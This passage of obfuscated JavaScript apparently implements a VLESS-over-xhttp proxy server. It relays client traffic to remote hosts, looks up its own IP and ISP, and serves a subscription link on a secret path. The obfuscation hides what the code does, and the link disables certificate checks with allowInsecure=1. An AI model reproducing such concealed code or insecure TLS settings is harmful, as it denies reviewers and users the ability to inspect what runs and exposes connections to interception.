_0x248789=_0xcbbe;if(_0x64cc9d)return;try{_0x528e2c?.[_0x248789(0x163)]();}catch(_0x2067c2){log('error',_0x248789(0x203),_0x2067c2['message']);}};return _0x5fcc8e['on']('error',_0xcf1a65),_0x5fcc8e['on'](_0x3c47b5(0x215),_0x4952a1),_0x5fcc8e['on'](_0x3c47b5(0x1bc),_0x23ff20),_0x94c13e&&(_0x94c13e['eventListeners'][_0x3c47b5(0x241)]('error'),_0x94c13e['eventListeners'][_0x3c47b5(0x241)](_0x3c47b5(0x215)),_0x94c13e[_0x3c47b5(0x1d6)]['add']('end')),{'readable':new ReadableStream({'start'(_0x4e25fc){_0x528e2c=_0x4e25fc;},'cancel'(){const _0x28e02c=_0x3c47b5;_0x64cc9d=!![],_0x5fcc8e[_0x28e02c(0x16b)](_0x28e02c(0x1ff),_0xcf1a65),_0x5fcc8e[_0x28e02c(0x16b)](_0x28e02c(0x215),_0x4952a1),_0x5fcc8e[_0x28e02c(0x16b)](_0x28e02c(0x1bc),_0x23ff20),_0x5fcc8e[_0x28e02c(0x1c6)]();}}),'writable':new WritableStream({'start'(_0x5e297c){_0x33acf6=_0x5e297c;},'write'(_0x18c142){return new Promise((_0xc89cf1,_0x25a04d)=>{const _0x596461=_0xcbbe;if(_0x5fcc8e[_0x596461(0x279)]||_0x64cc9d){_0x25a04d(new Error('Socket\x20is\x20destroyed'));return;}_0x5fcc8e[_0x596461(0x1a6)](_0x18c142,_0x91aba5=>{if(_0x91aba5)_0x25a04d(_0x91aba5);else _0xc89cf1();});});},'close'(){const _0x4907b8=_0x3c47b5;_0x64cc9d=!![],_0x5fcc8e[_0x4907b8(0x16b)](_0x4907b8(0x1ff),_0xcf1a65),_0x5fcc8e[_0x4907b8(0x16b)](_0x4907b8(0x215),_0x4952a1),_0x5fcc8e['removeListener'](_0x4907b8(0x1bc),_0x23ff20),!_0x5fcc8e['destroyed']&&_0x5fcc8e[_0x4907b8(0x1bc)]();},'abort'(_0x213d7d){const _0x523967=_0x3c47b5;_0x64cc9d=!![],_0x5fcc8e['removeListener'](_0x523967(0x1ff),_0xcf1a65),_0x5fcc8e[_0x523967(0x16b)](_0x523967(0x215),_0x4952a1),_0x5fcc8e[_0x523967(0x16b)](_0x523967(0x1bc),_0x23ff20),_0x5fcc8e[_0x523967(0x1c6)](_0x213d7d);}})};}function relay(_0x549829,_0xff674f,_0x61f50,_0x35ebe6,_0x4559ca){const _0x507099=_0x49f815,_0x3960d3=pipe_relay();let _0x513372=![];const _0x472e99=socketToWebStream(_0x61f50,_0x4559ca);function _0x327874(){const _0x46cc86=_0xcbbe;if(!_0x513372){_0x513372=!![];try{_0x61f50['destroy']();}catch(_0xced4d8){!_0xced4d8[_0x46cc86(0x278)][_0x46cc86(0x1b0)](_0x46cc86(0x1ad))&&!_0xced4d8[_0x46cc86(0x278)][_0x46cc86(0x1b0)](_0x46cc86(0x231))&&log(_0x46cc86(0x1ff),_0x46cc86(0x17d)+_0xced4d8['message']);}}}const _0x37b667=_0x3960d3(_0xff674f,_0x472e99,_0x35ebe6[_0x507099(0x215)])[_0x507099(0x177)](_0x5e8bd3=>{const _0x5dfecd=_0x507099;!_0x5e8bd3[_0x5dfecd(0x278)][_0x5dfecd(0x1b0)]('aborted')&&!_0x5e8bd3[_0x5dfecd(0x278)]['includes'](_0x5dfecd(0x231))&&log(_0x5dfecd(0x1ff),'Upload\x20error:\x20'+_0x5e8bd3[_0x5dfecd(0x278)]);})[_0x507099(0x1d9)](()=>{const _0x281cf7=_0x507099;_0xff674f[_0x281cf7(0x280)]&&_0xff674f[_0x281cf7(0x280)]();}),_0x3dc38c=_0x3960d3(_0x472e99,_0xff674f,_0x35ebe6[_0x507099(0x22d)])[_0x507099(0x177)](_0x51f8d4=>{const _0xf3607d=_0x507099;!_0x51f8d4[_0xf3607d(0x278)][_0xf3607d(0x1b0)](_0xf3607d(0x1ad))&&!_0x51f8d4[_0xf3607d(0x278)][_0xf3607d(0x1b0)]('socket\x20hang\x20up')&&log(_0xf3607d(0x1ff),_0xf3607d(0x2a4)+_0x51f8d4[_0xf3607d(0x278)]);});_0x3dc38c[_0x507099(0x1d9)](()=>_0x37b667)[_0x507099(0x1d9)](_0x327874);}const sessions=new Map();function cleanupExpiredSessions(){const _0x2ef23c=_0x49f815,_0x1773f6=Date[_0x2ef23c(0x258)](),_0xbf6c25=[];for(const [_0x4cc643,_0x439f52]of sessions){_0x1773f6-_0x439f52['lastActivity']>SETTINGS[_0x2ef23c(0x219)]&&_0xbf6c25['push'](_0x4cc643);}for(const _0x3ef37a of _0xbf6c25){const _0x3e2752=sessions[_0x2ef23c(0x259)](_0x3ef37a);_0x3e2752&&(log(_0x2ef23c(0x18f),_0x2ef23c(0x272)+_0x3ef37a),_0x3e2752[_0x2ef23c(0x1f2)]());}_0xbf6c25[_0x2ef23c(0x28b)]>0x0&&log(_0x2ef23c(0x1cb),_0x2ef23c(0x264)+_0xbf6c25[_0x2ef23c(0x28b)]+'\x20expired\x20sessions');}setInterval(cleanupExpiredSessions,SETTINGS['SESSION_CLEANUP_INTERVAL']);const performanceStats={'totalConnections':0x0,'activeConnections':0x0,'totalBytesTransferred':0x0,'averageSpeed':0x0,'peakMemoryUsage':0x0,'startTime':Date[_0x49f815(0x258)]()};function monitorMemory(){const _0x2e15f8=_0x49f815,_0x1d1326=process[_0x2e15f8(0x213)](),_0x194d42=Math['round'](_0x1d1326[_0x2e15f8(0x1e3)]/0x400/0x400),_0x269e60=Math[_0x2e15f8(0x21a)](_0x1d1326[_0x2e15f8(0x1b4)]/0x400/0x400);performanceStats[_0x2e15f8(0x1b7)]=Math[_0x2e15f8(0x1a5)](performanceStats[_0x2e15f8(0x1b7)],_0x194d42);const _0x25f801=Math[_0x2e15f8(0x21a)]((Date[_0x2e15f8(0x258)]()-performanceStats[_0x2e15f8(0x218)])/0x3e8),_0x26c27f=performanceStats[_0x2e15f8(0x18e)]>0x0?Math['round'](performanceStats[_0x2e15f8(0x18e)]/_0x25f801/0x400):0x0;log(_0x2e15f8(0x18f),_0x2e15f8(0x245)+_0x194d42+_0x2e15f8(0x291)+_0x269e60+'MB,\x20Sessions:\x20'+sessions[_0x2e15f8(0x187)]+_0x2e15f8(0x25f)+_0x26c27f+'KB/s');if(_0x194d42>0x1f4){log('warn',_0x2e15f8(0x168)+_0x194d42+_0x2e15f8(0x1ac));if(global['gc']){global['gc']();const _0x4a561f=process['memoryUsage'](),_0x304481=Math[_0x2e15f8(0x21a)](_0x4a561f[_0x2e15f8(0x1e3)]/0x400/0x400);log(_0x2e15f8(0x1cb),'After\x20GC:\x20'+_0x304481+'MB\x20(freed\x20'+(_0x194d42-_0x304481)+_0x2e15f8(0x287));}}}function logPerformanceStats(){const _0x4e0d81=_0x49f815,_0x51f837=Math[_0x4e0d81(0x21a)]((Date[_0x4e0d81(0x258)]()-performanceStats[_0x4e0d81(0x218)])/0x3e8),_0x376739=performanceStats[_0x4e0d81(0x18e)]>0x0?Math[_0x4e0d81(0x21a)](performanceStats[_0x4e0d81(0x18e)]/_0x51f837/0x400):0x0;log(_0x4e0d81(0x1cb),'Performance\x20Stats\x20-\x20Uptime:\x20'+_0x51f837+_0x4e0d81(0x1b8)+performanceStats['totalConnections']+',\x20Active:\x20'+sessions['size']+_0x4e0d81(0x26d)+Math['round'](performanceStats[_0x4e0d81(0x18e)]/0x400/0x400)+_0x4e0d81(0x24d)+_0x376739+'KB/s,\x20Peak\x20Memory:\x20'+performanceStats[_0x4e0d81(0x1b7)]+'MB');}setInterval(monitorMemory,0x7530),setInterval(logPerformanceStats,0x493e0);class Session{constructor(_0x31e189){const _0x43522c=_0x49f815;this[_0x43522c(0x206)]=_0x31e189,this['nextSeq']=0x0,this[_0x43522c(0x1be)]=![],this['lastActivity']=Date['now'](),this['vlessHeader']=null,this[_0x43522c(0x27a)]=null,this['initialized']=![],this['responseHeader']=null,this[_0x43522c(0x166)]=![],this[_0x43522c(0x27e)]=new Map(),this[_0x43522c(0x202)]=![],this[_0x43522c(0x1c0)]=[],this['currentStreamRes']=null,this[_0x43522c(0x284)]=new Map(),this['cleanupTimer']=null,this[_0x43522c(0x1d6)]=new Set(),this[_0x43522c(0x17f)]=0x0,this[_0x43522c(0x218)]=Date[_0x43522c(0x258)](),log('debug',_0x43522c(0x27c)+_0x31e189),performanceStats[_0x43522c(0x1cd)]++,performanceStats[_0x43522c(0x281)]++,this[_0x43522c(0x1c2)]=setTimeout(()=>{this['cleanup']();},SETTINGS['MAX_SESSION_AGE']);}async[_0x49f815(0x1c8)](_0x585c26){const _0x4fa9a0=_0x49f815;if(this['initialized'])return!![];try{log('debug','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet');const _0x551ad7=new ReadableStream({'start'(_0x1a3529){const _0xaa6bd0=_0xcbbe;_0x1a3529['enqueue'](_0x585c26),_0x1a3529[_0xaa6bd0(0x163)]();}}),_0x1a74b0={'readable':_0x551ad7,'writable':new WritableStream()};return this[_0x4fa9a0(0x1f8)]=await parse_header(SETTINGS[_0x4fa9a0(0x265)],_0x1a74b0),log(_0x4fa9a0(0x1cb),_0x4fa9a0(0x28a)+this['vlessHeader'][_0x4fa9a0(0x196)]+':'+this[_0x4fa9a0(0x1f8)][_0x4fa9a0(0x223)]),this[_0x4fa9a0(0x27a)]=await connect_remote(this['vlessHeader'][_0x4fa9a0(0x196)],this[_0x4fa9a0(0x1f8)][_0x4fa9a0(0x223)]),log(_0x4fa9a0(0x1cb),_0x4fa9a0(0x165)),this[_0x4fa9a0(0x1d1)]=!![],!![];}catch(_0x221bd2){return log(_0x4fa9a0(0x1ff),'Failed\x20to\x20initialize\x20VLESS:\x20'+_0x221bd2[_0x4fa9a0(0x278)]),![];}}async['processPacket'](_0x29a367,_0xe460b8){const _0x13f632=_0x49f815;try{this[_0x13f632(0x224)]=Date[_0x13f632(0x258)](),this[_0x13f632(0x284)][_0x13f632(0x170)](_0x29a367,_0xe460b8),log(_0x13f632(0x18f),_0x13f632(0x24f)+_0x29a367+',\x20size='+_0xe460b8[_0x13f632(0x28b)]);if(_0x29a367===0x0&&!this['initialized']){const _0x27312c=this[_0x13f632(0x284)]['get'](0x0);this['pendingBuffers'][_0x13f632(0x226)](0x0);if(!await this['initializeVLESS'](_0x27312c))throw new Error(_0x13f632(0x16c));return this[_0x13f632(0x20d)]=Buffer['from']([0x0,0x0]),await this[_0x13f632(0x1e1)](this[_0x13f632(0x1f8)][_0x13f632(0x215)]),await this['_processPendingPackets'](),!![];}if(this[_0x13f632(0x1d1)])return await this[_0x13f632(0x1e1)](_0xe460b8),!![];if(!this[_0x13f632(0x1d1)])return log(_0x13f632(0x18f),'Waiting\x20for\x20initialization,\x20buffering\x20packet\x20seq='+_0x29a367),!![];if(this[_0x13f632(0x284)]['size']>SETTINGS['MAX_BUFFERED_POSTS'])throw new Error('Too\x20many\x20buffered\x20packets');return!![];}catch(_0x9acaef){log('error',_0x13f632(0x1d7)+_0x9acaef[_0x13f632(0x278)]);throw _0x9acaef;}}async[_0x49f815(0x292)](){const _0x268299=_0x49f815,_0x3073ac=Array[_0x268299(0x184)](this[_0x268299(0x284)][_0x268299(0x1b2)]())[_0x268299(0x180)]((_0x2e4646,_0xc0ee1e)=>_0x2e4646-_0xc0ee1e);for(const _0x2cd031 of _0x3073ac){if(_0x2cd031>0x0){const _0x4b725b=this[_0x268299(0x284)][_0x268299(0x259)](_0x2cd031);this[_0x268299(0x284)][_0x268299(0x226)](_0x2cd031),this[_0x268299(0x1d1)]&&(await this[_0x268299(0x1e1)](_0x4b725b),log(_0x268299(0x18f),_0x268299(0x1cc)+_0x2cd031));}}}[_0x49f815(0x1eb)](){const _0xe0fbc7=_0x49f815;if(!this[_0xe0fbc7(0x274)]||!this[_0xe0fbc7(0x20d)])return;try{const _0x5c44a3=this['currentStreamRes'][_0xe0fbc7(0x1f3)]?.[_0xe0fbc7(0x2a0)]||_0xe0fbc7(0x21b),_0x168aa4=_0x5c44a3==='h2';!this[_0xe0fbc7(0x166)]&&(log('debug',_0xe0fbc7(0x208)+_0x5c44a3+_0xe0fbc7(0x200)+this['responseHeader']['length']+'\x20bytes'),this[_0xe0fbc7(0x274)]['write'](this['responseHeader']),this[_0xe0fbc7(0x166)]=!![]);if(_0x168aa4){this[_0xe0fbc7(0x274)][_0xe0fbc7(0x1f3)][_0xe0fbc7(0x286)](!![]);const _0x5cb9d4=new require(_0xe0fbc7(0x293))['Transform']({'transform'(_0x4847c5,_0x3ffa69,_0x314ca2){const _0x16165d=_0xe0fbc7,_0x403ebe=0x4000;for(let _0xeda59e=0x0;_0xeda59e<_0x4847c5[_0x16165d(0x28b)];_0xeda59e+=_0x403ebe){this[_0x16165d(0x194)](_0x4847c5[_0x16165d(0x1ba)](_0xeda59e,_0xeda59e+_0x403ebe));}_0x314ca2();}});this['remote']['pipe'](_0x5cb9d4)[_0xe0fbc7(0x21e)](this[_0xe0fbc7(0x274)]);}else this[_0xe0fbc7(0x27a)][_0xe0fbc7(0x21e)](this[_0xe0fbc7(0x274)]);this['remote']['on']('end',()=>{const _0xb5b71a=_0xe0fbc7;!this[_0xb5b71a(0x274)][_0xb5b71a(0x260)]&&this[_0xb5b71a(0x274)][_0xb5b71a(0x1bc)]();}),this[_0xe0fbc7(0x27a)]['on'](_0xe0fbc7(0x1ff),_0x2f9c44=>{const _0x47d969=_0xe0fbc7;log(_0x47d969(0x1ff),_0x47d969(0x19d)+_0x2f9c44[_0x47d969(0x278)]),!this[_0x47d969(0x274)][_0x47d969(0x260)]&&this[_0x47d969(0x274)][_0x47d969(0x1bc)]();});}catch(_0x25cbc4){log('error',_0xe0fbc7(0x27d)+_0x25cbc4[_0xe0fbc7(0x278)]),this[_0xe0fbc7(0x1f2)]();}}[_0x49f815(0x18d)](_0x1d2237,_0x32b1fa){const _0x3d8d33=_0x49f815;!_0x1d2237[_0x3d8d33(0x1da)]&&_0x1d2237[_0x3d8d33(0x1f6)](0xc8,_0x32b1fa);this[_0x3d8d33(0x274)]=_0x1d2237;this['initialized']&&this[_0x3d8d33(0x20d)]&&this[_0x3d8d33(0x1eb)]();const _0x25e122=()=>{const _0x3e7c65=_0x3d8d33;log(_0x3e7c65(0x1cb),_0x3e7c65(0x191)),this[_0x3e7c65(0x1f2)]();};return _0x1d2237['on']('close',_0x25e122),this[_0x3d8d33(0x1d6)]['add'](_0x3d8d33(0x163)),this[_0x3d8d33(0x224)]=Date['now'](),!![];}async[_0x49f815(0x1e1)](_0x11cb5f){const _0x209899=_0x49f815;if(!this[_0x209899(0x27a)]||this['remote']['destroyed'])throw new Error(_0x209899(0x1f1));return new Promise((_0x44012b,_0x592353)=>{const _0x1468c1=_0x209899;this[_0x1468c1(0x27a)]['write'](_0x11cb5f,_0x542543=>{const _0x550d6c=_0x1468c1;_0x542543?(log(_0x550d6c(0x1ff),_0x550d6c(0x181)+_0x542543['message']),_0x592353(_0x542543)):(this[_0x550d6c(0x17f)]+=_0x11cb5f[_0x550d6c(0x28b)],_0x44012b());});});}[_0x49f815(0x1eb)](){const _0x4f9838=_0x49f815;if(!this[_0x4f9838(0x274)]||!this[_0x4f9838(0x20d)])return;try{!this['headerSent']&&(this[_0x4f9838(0x274)]['write'](this['responseHeader']),this['headerSent']=!![]);this[_0x4f9838(0x27a)][_0x4f9838(0x21e)](this[_0x4f9838(0x274)]);const _0xebea12=()=>{const _0x4af0c7=_0x4f9838;!this[_0x4af0c7(0x274)]['writableEnded']&&this[_0x4af0c7(0x274)][_0x4af0c7(0x1bc)]();},_0x55ca1e=_0x73fa76=>{const _0x16d23a=_0x4f9838;log('error',_0x16d23a(0x19d)+_0x73fa76[_0x16d23a(0x278)]),!this[_0x16d23a(0x274)]['writableEnded']&&this[_0x16d23a(0x274)][_0x16d23a(0x1bc)]();};this[_0x4f9838(0x27a)]['on']('end',_0xebea12),this[_0x4f9838(0x27a)]['on']('error',_0x55ca1e),this[_0x4f9838(0x1d6)][_0x4f9838(0x241)](_0x4f9838(0x1bc)),this[_0x4f9838(0x1d6)][_0x4f9838(0x241)](_0x4f9838(0x1ff));}catch(_0x2fdc0e){log(_0x4f9838(0x1ff),_0x4f9838(0x27d)+_0x2fdc0e[_0x4f9838(0x278)]),this[_0x4f9838(0x1f2)]();}}[_0x49f815(0x1f2)](){const _0x529f2d=_0x49f815;if(!this['cleaned']){this[_0x529f2d(0x202)]=!![],performanceStats[_0x529f2d(0x18e)]+=this[_0x529f2d(0x17f)],performanceStats['activeConnections']--;const _0x550e95=Date[_0x529f2d(0x258)]()-this['startTime'],_0x59bd04=this['bytesTransferred']>0x0?Math['round'](this[_0x529f2d(0x17f)]/_0x550e95*0x3e8/0x400):0x0;log('debug','Cleaning\x20up\x20session\x20'+this[_0x529f2d(0x206)]+_0x529f2d(0x26e)+Math['round'](_0x550e95/0x3e8)+'s,\x20Transferred:\x20'+Math['round'](this[_0x529f2d(0x17f)]/0x400)+'KB,\x20Speed:\x20'+_0x59bd04+_0x529f2d(0x211)),this[_0x529f2d(0x1c2)]&&(clearTimeout(this[_0x529f2d(0x1c2)]),this[_0x529f2d(0x1c2)]=null),this[_0x529f2d(0x27a)]&&(this[_0x529f2d(0x27a)][_0x529f2d(0x1ce)](),this[_0x529f2d(0x27a)][_0x529f2d(0x1c6)](),this[_0x529f2d(0x27a)]=null),this[_0x529f2d(0x274)]&&(this[_0x529f2d(0x274)][_0x529f2d(0x1ce)](),this[_0x529f2d(0x274)]=null),this['pendingBuffers'][_0x529f2d(0x227)](),this[_0x529f2d(0x27e)][_0x529f2d(0x227)](),this[_0x529f2d(0x1c0)]=[],this[_0x529f2d(0x1d6)][_0x529f2d(0x227)](),this[_0x529f2d(0x1d1)]=![],this[_0x529f2d(0x166)]=![],sessions['delete'](this[_0x529f2d(0x206)]);}}}async function getISPInfo(){const _0x243af7=_0x49f815;try{const _0x399a99=await axios[_0x243af7(0x259)](_0x243af7(0x23e),{'headers':{'User-Agent':_0x243af7(0x1ab),'timeout':0x1388}}),_0x5d423d=_0x399a99[_0x243af7(0x215)],_0x33ca45=_0x5d423d[_0x243af7(0x15f)]||'Unknown',_0x1280da=_0x5d423d[_0x243af7(0x214)]||_0x243af7(0x248),_0x198b3f=(_0x33ca45+'-'+_0x1280da)[_0x243af7(0x161)](/[^a-zA-Z0-9\-_]/g,'_');return log(_0x243af7(0x1cb),_0x243af7(0x26c)+_0x198b3f),_0x198b3f;}catch(_0x4cc57b){return log(_0x243af7(0x1ff),'Failed\x20to\x20get\x20ISP\x20info:\x20'+_0x4cc57b[_0x243af7(0x278)]),_0x243af7(0x249);}}async function getServerIP(){const _0xf11df8=_0x49f815;if(DOMAIN)return DOMAIN;const _0x1cb582=[_0xf11df8(0x295),'https://ipinfo.io/ip',_0xf11df8(0x24a)];for(const _0x1b7ebc of _0x1cb582){try{const _0x42b083=await axios[_0xf11df8(0x259)](_0x1b7ebc,{'timeout':0x1388,'headers':{'User-Agent':_0xf11df8(0x1ab)}}),_0x5d3803=_0x42b083[_0xf11df8(0x215)][_0xf11df8(0x1fe)]();if(_0x5d3803&&/^\d+\.\d+\.\d+\.\d+$/[_0xf11df8(0x267)](_0x5d3803))return log(_0xf11df8(0x1cb),_0xf11df8(0x244)+_0x5d3803+'\x20from\x20'+_0x1b7ebc),_0x5d3803;}catch(_0x168da7){log(_0xf11df8(0x18f),_0xf11df8(0x1c9)+_0x1b7ebc+':\x20'+_0x168da7[_0xf11df8(0x278)]);}}try{const _0x5c4e62=await axios[_0xf11df8(0x259)]('https://ipv6.ip.sb',{'timeout':0x1388,'headers':{'User-Agent':_0xf11df8(0x1ab)}}),_0x2972f3=_0x5c4e62[_0xf11df8(0x215)][_0xf11df8(0x1fe)]();if(_0x2972f3)return log(_0xf11df8(0x1cb),_0xf11df8(0x17e)+_0x2972f3),'['+_0x2972f3+']';}catch(_0x37c7b7){log(_0xf11df8(0x18f),_0xf11df8(0x21c),_0x37c7b7[_0xf11df8(0x278)]);}return log(_0xf11df8(0x253),'Failed\x20to\x20get\x20server\x20IP,\x20using\x20localhost'),'localhost';}let IP='localhost',ISP=_0x49f815(0x249);Promise[_0x49f815(0x220)]([getServerIP()[_0x49f815(0x298)](_0x2d1a99=>{IP=_0x2d1a99;}),getISPInfo()[_0x49f815(0x298)](_0x482832=>{ISP=_0x482832;})])['then'](()=>{const _0x594952=_0x49f815;log(_0x594952(0x1cb),'Server\x20info:\x20IP='+IP+_0x594952(0x233)+ISP);})['catch'](_0x343626=>{const _0x392a18=_0x49f815;log(_0x392a18(0x1ff),_0x392a18(0x269)+_0x343626[_0x392a18(0x278)]);});const server=http[_0x49f815(0x276)]((_0x10fd3f,_0x351caf)=>{const _0x3457fd=_0x49f815,_0x4e4d19={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':_0x3457fd(0x185),'Cache-Control':'no-store','X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x10fd3f['url']==='/'){_0x351caf[_0x3457fd(0x1f6)](0xc8,{'Content-Type':'text/plain'}),_0x351caf[_0x3457fd(0x1bc)](_0x3457fd(0x23b));return;}if(_0x10fd3f[_0x3457fd(0x1e9)]==='/'+SUB_PATH){const _0x3cdf71=NAME?NAME+'-'+ISP:ISP;let _0x303904,_0x11fe0f;!DOMAIN?(_0x303904=PORT,_0x11fe0f=_0x3457fd(0x1f5)):(_0x303904=0x1bb,_0x11fe0f=_0x3457fd(0x229));const _0x32e8e2=_0x3457fd(0x1ca)+UUID+'@'+IP+':'+_0x303904+'?encryption=none&security='+_0x11fe0f+_0x3457fd(0x255)+IP+'&alpn=h2%2Chttp%2F1.1&fp=chrome&allowInsecure=1&type=xhttp&host='+IP+'&path='+SETTINGS[_0x3457fd(0x230)]+_0x3457fd(0x1db)+_0x3cdf71,_0x5279c4=Buffer[_0x3457fd(0x184)](_0x32e8e2)['toString'](_0x3457fd(0x254));_0x351caf[_0x3457fd(0x1f6)](0xc8,{'Content-Type':'text/plain'}),_0x351caf[_0x3457fd(0x1bc)](_0x5279c4+'\x0a');return;}const _0x9bed80=_0x10fd3f[_0x3457fd(0x1e9)][_0x3457fd(0x290)](new RegExp(XPATH+_0x3457fd(0x26a)));if(!_0x9bed80){_0x351caf[_0x3457fd(0x1f6)](0x194),_0x351caf['end']();return;}const _0x3c521b=_0x9bed80[0x1],_0x4ebf4d=_0x9bed80[0x2]?parseInt(_0x9bed80[0x2]):null;if(_0x10fd3f['method']===_0x3457fd(0x20e)&&!_0x4ebf4d){const _0x415ee8=_0x351caf['socket'];if(!_0x415ee8){log('error',_0x3457fd(0x28f)),_0x351caf['writeHead'](0x1f4),_0x351caf['end']();return;}let _0x4a59a9=sessions[_0x3457fd(0x259)](_0x3c521b);!_0x4a59a9&&(_0x4a59a9=new Session(_0x3c521b),sessions[_0x3457fd(0x170)](_0x3c521b,_0x4a59a9),log(_0x3457fd(0x1cb),'Created\x20new\x20session\x20for\x20GET:\x20'+_0x3c521b));_0x4a59a9[_0x3457fd(0x1be)]=!![];const _0x184405='HTTP/1.1\x20200\x20OK\x0d\x0a'+_0x3457fd(0x297)+_0x3457fd(0x26b)+'\x0d\x0a';try{_0x415ee8[_0x3457fd(0x1a6)](_0x184405),log('debug',_0x3457fd(0x160)+_0x3c521b);}catch(_0x23b36d){log(_0x3457fd(0x1ff),_0x3457fd(0x195)+_0x23b36d[_0x3457fd(0x278)]),_0x4a59a9['cleanup']();return;}let _0x1739ec=0x0;const _0xde2639=0x258,_0x8a211a=()=>{const _0x2f4452=_0x3457fd;if(_0x4a59a9[_0x2f4452(0x1d1)]&&_0x4a59a9['responseHeader'])try{_0x415ee8['write'](_0x4a59a9[_0x2f4452(0x20d)]),log(_0x2f4452(0x18f),_0x2f4452(0x21f)+_0x3c521b),_0x4a59a9['remote']['on'](_0x2f4452(0x215),_0x5578a3=>{const _0x42c350=_0x2f4452;try{!_0x415ee8[_0x42c350(0x279)]&&_0x415ee8[_0x42c350(0x1a6)](_0x5578a3);}catch(_0x5758ba){log(_0x42c350(0x18f),_0x42c350(0x1cf)+_0x5758ba[_0x42c350(0x278)]),_0x4a59a9[_0x42c350(0x1f2)]();}}),_0x415ee8['on'](_0x2f4452(0x215),_0x51da57=>{const _0x285a84=_0x2f4452;try{!_0x4a59a9[_0x285a84(0x27a)][_0x285a84(0x279)]&&_0x4a59a9['remote'][_0x285a84(0x1a6)](_0x51da57);}catch(_0x291d12){log(_0x285a84(0x18f),'Error\x20writing\x20to\x20remote:\x20'+_0x291d12[_0x285a84(0x278)]),_0x4a59a9[_0x285a84(0x1f2)]();}}),_0x4a59a9[_0x2f4452(0x27a)]['on'](_0x2f4452(0x163),()=>{const _0x272bd3=_0x2f4452;!_0x415ee8[_0x272bd3(0x279)]&&_0x415ee8[_0x272bd3(0x1bc)]();}),_0x4a59a9[_0x2f4452(0x27a)]['on'](_0x2f4452(0x1ff),_0x333e75=>{const _0x139631=_0x2f4452;log(_0x139631(0x18f),_0x139631(0x23f)+_0x333e75['message']),!_0x415ee8[_0x139631(0x279)]&&_0x415ee8[_0x139631(0x1bc)]();}),_0x415ee8['on'](_0x2f4452(0x163),()=>{const _0x21a5eb=_0x2f4452;log(_0x21a5eb(0x18f),_0x21a5eb(0x174)+_0x3c521b),_0x4a59a9['cleanup']();}),_0x415ee8['on'](_0x2f4452(0x1ff),_0x2341c7=>{const _0x21ba87=_0x2f4452;log('debug',_0x21ba87(0x261)+_0x3c521b+':\x20'+_0x2341c7[_0x21ba87(0x278)]),_0x4a59a9[_0x21ba87(0x1f2)]();});}catch(_0x1d97ae){log(_0x2f4452(0x1ff),_0x2f4452(0x251)+_0x1d97ae[_0x2f4452(0x278)]),_0x4a59a9[_0x2f4452(0x1f2)]();}else _0x1739ec<_0xde2639?(_0x1739ec++,setTimeout(_0x8a211a,0x32)):(log(_0x2f4452(0x1ff),_0x2f4452(0x20c)+_0x3c521b),_0x4a59a9[_0x2f4452(0x1f2)](),_0x415ee8[_0x2f4452(0x1bc)]());};_0x8a211a();return;}if(_0x10fd3f[_0x3457fd(0x178)]===_0x3457fd(0x209)&&_0x4ebf4d!==null){let _0x2d4470=sessions[_0x3457fd(0x259)](_0x3c521b);!_0x2d4470&&(_0x2d4470=new Session(_0x3c521b),sessions[_0x3457fd(0x170)](_0x3c521b,_0x2d4470),log('info','Created\x20new\x20session\x20for\x20POST:\x20'+_0x3c521b),setTimeout(()=>{const _0x3c649b=_0x3457fd,_0x23d5a6=sessions[_0x3c649b(0x259)](_0x3c521b);_0x23d5a6&&!_0x23d5a6[_0x3c649b(0x1be)]&&(log(_0x3c649b(0x253),_0x3c649b(0x1df)+_0x3c521b+_0x3c649b(0x164)),_0x23d5a6['cleanup']());},SETTINGS[_0x3457fd(0x221)]));let _0x4db122=[],_0x5da79f=0x0,_0x4d17ca=![];_0x10fd3f['on'](_0x3457fd(0x215),_0x5939e9=>{const _0x3bce20=_0x3457fd;_0x5da79f+=_0x5939e9[_0x3bce20(0x28b)];if(_0x5da79f>SETTINGS[_0x3bce20(0x167)]){!_0x4d17ca&&(_0x351caf[_0x3bce20(0x1f6)](0x19d),_0x351caf[_0x3bce20(0x1bc)](),_0x4d17ca=!![]);return;}_0x4db122['push'](_0x5939e9);}),_0x10fd3f['on'](_0x3457fd(0x1bc),async()=>{const _0xf6dd39=_0x3457fd;if(_0x4d17ca)return;try{const _0x5deb31=Buffer[_0xf6dd39(0x225)](_0x4db122);log(_0xf6dd39(0x1cb),_0xf6dd39(0x1d0)+_0x4ebf4d+_0xf6dd39(0x25b)+_0x5deb31[_0xf6dd39(0x28b)]),await _0x2d4470[_0xf6dd39(0x1fa)](_0x4ebf4d,_0x5deb31),!_0x4d17ca&&(_0x351caf[_0xf6dd39(0x1f6)](0xc8,_0x4e4d19),_0x4d17ca=!![]),_0x351caf[_0xf6dd39(0x1bc)]();}catch(_0x32751a){log(_0xf6dd39(0x1ff),_0xf6dd39(0x275)+_0x32751a[_0xf6dd39(0x278)]),_0x2d4470['cleanup'](),!_0x4d17ca&&(_0x351caf[_0xf6dd39(0x1f6)](0x1f4),_0x4d17ca=!![]),_0x351caf[_0xf6dd39(0x1bc)]();}});return;}_0x351caf['writeHead'](0x194),_0x351caf[_0x3457fd(0x1bc)]();});server['on'](_0x49f815(0x247),_0x240c9c=>{const _0x4ee710=_0x49f815;log(_0x4ee710(0x18f),'New\x20secure\x20connection\x20using:\x20'+(_0x240c9c[_0x4ee710(0x2a0)]||_0x4ee710(0x21b)));});function generatePadding(_0x206fb1,_0x3aa666){const _0x475c25=_0x49f815,_0x5bf960=_0x206fb1+Math[_0x475c25(0x1fd)](Math[_0x475c25(0x20b)]()*(_0x3aa666-_0x206fb1));return Buffer[_0x475c25(0x184)](Array(_0x5bf960)[_0x475c25(0x299)]('X')['join'](''))[_0x475c25(0x19f)](_0x475c25(0x254));}server['keepAliveTimeout']=0x493e0,server[_0x49f815(0x186)]=0xea60,server[_0x49f815(0x169)]=0x493e0,server[_0x49f815(0x17c)]=0x493e0,server[_0x49f815(0x20f)]=0x3e8,server['on']('upgrade',(_0x283c1f,_0x1bdda0,_0x200555)=>{const _0x4e1c4e=_0x49f815;log(_0x4e1c4e(0x18f),_0x4e1c4e(0x20a));}),server['on'](_0x49f815(0x1bf),_0x3c96ac=>{const 